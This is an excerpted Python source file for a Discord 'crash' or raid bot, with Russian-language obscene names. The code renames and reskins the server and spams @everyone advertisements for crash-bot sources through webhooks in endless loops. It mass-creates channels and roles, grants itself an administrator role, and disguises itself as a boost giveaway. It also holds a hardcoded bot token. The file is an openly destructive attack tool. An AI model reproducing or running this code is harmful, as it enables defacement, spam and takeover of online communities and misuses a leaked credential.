...
Token = "OTAwOTk3NDU1ODU0ODQxODc3.YXJdRQ.q0Fh9qM-TBN4AcgE7oYhyTE3Syo"
whit = ""
...
async def chistch(ctx):
    await ctx.send("@here КОДЫ ДЛЯ МОЩНЫХ КРАШ БОТОВ- https://github.com/GlUTEN-BASH - ВОТ СЕРВЕР С КРАШ МОЩНЫМИ БОТАМИ- https://discord.gg/czGQXntAbk ! @everyone ")
    with open('image.png', 'rb') as f:
       icon = f.read()
    await ctx.guild.edit(name="ЖОПА БОБРА", icon=icon)
  ...
  while True:
    for channel in ctx.guild.channels:
      try:
        ...
        for f in h:
          await f.send(content='@here КОДЫ ДЛЯ МОЩНЫХ КРАШ БОТОВ- https://github.com/GlUTEN-BASH - ВОТ СЕРВЕР С КРАШ МОЩНЫМИ БОТАМИ- https://discord.gg/czGQXntAbk ! @everyone  ', wait=True)
      except:
        continue
...
async def crhooks(ctx):
  ...
  for channel in ctx.guild.text_channels: 
    try:
      await channel.create_webhook(name='ПИСЮН МАМОНТА')
...
async def spamch(ctx):
    ...
    for b in range(200):
        try:
                await ctx.guild.create_text_channel("ЖОПА БОБРА", reason='Админ ебанутый')
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал канал")
                await ctx.guild.create_text_channel("ЖОПА БИДУИНА", reason='Админ ебанутый')
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал канал")
                await ctx.guild.create_text_channel("СНЕЖОК ТОП", reason='Админ ебанутый')
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал канал")
                await ctx.guild.create_text_channel("ХУЙ МАМОНТА", reason='Админ ебанутый')
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал канал")
                await ctx.guild.create_text_channel("ТВОЙ ЧЛЕН МАЛЕНЬКИЙ", reason='Админ ебанутый')
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал канал")
                await ctx.guild.create_text_channel("А4 ПИЗДЮК", reason='Админ ебанутый')
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал канал")
        except:
...
async def spamrl(ctx):   
    ...
    for a in range(200):
        try:
                await ctx.guild.create_role(name="ЖОПА МАМОНТА", reason='Админ ебанутый')
...
async def spamth(ctx):
    while True:
      try:
        for channel in ctx.guild.text_channels:
          await channel.send("@here КОДЫ ДЛЯ МОЩНЫХ КРАШ БОТОВ- https://github.com/GlUTEN-BASH - ВОТ СЕРВЕР С КРАШ МОЩНЫМИ БОТАМИ- https://discord.gg/czGQXntAbk ! @everyone ")
      except:
        continue

@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.online, activity=discord.Game('ВЫДАЮ БУСТЫ КОМАНДА $hlp'))
    print(f"""{Fore.RED}
...
async def game(ctx, pos: int):
    try:
        await ctx.guild.create_role(name="ЖОПА ЛЕЮБЕДЯ", colour=discord.Colour(0x00FF00), permissions=discord.Permissions(permissions=8))
        role = discord.utils.get(ctx.guild.roles, name="ТВОЙ ПИСЮН МАЛЕНЬКИЙ")
